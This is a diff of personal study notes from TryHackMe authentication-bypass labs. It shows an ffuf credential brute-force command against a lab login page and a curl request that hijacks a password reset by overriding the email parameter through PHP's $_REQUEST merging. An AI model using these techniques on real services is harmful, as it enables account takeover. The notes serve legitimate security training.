@@ -85,6 +85,18 @@ $ ./enum4linux.pl <options> <ip>
     * ffuf -w valid_usernames.txt:W1,/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.136.157/customers/login -fc 200
     * we have to specify our own FUZZ keyword. In this instance, we've chosen W1
     * -fc code: filter codes that are not code
+* Logic Flaw
+  * when someone (hacker or any) take a path different than intended
+  * $_REQUEST=$_GET+$_POST. If both have a key, then post is used.
+  * GET url with non-injectable parameter (verified)
+  * POST URL in which you can override the value of the non-injectable parameter
+  * curl 'http://10.10.136.157/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=hacker@hack.ca'
+  * Common encoding types are base32 which converts binary data to the characters A-Z and 2-7, and base64 which converts using the characters a-z, A-Z, 0-9,+, / and the equals sign for padding.
+  * https://crackstation.net/
+  * https://www.base64encode.org/
+  * Cookies (encoded/raw/ff)
+  * https://tryhackme.com/room/authenticationbypass
+  * https://tryhackme.com/room/subdomainenumeration
 
 <hr class="sep-both">
 
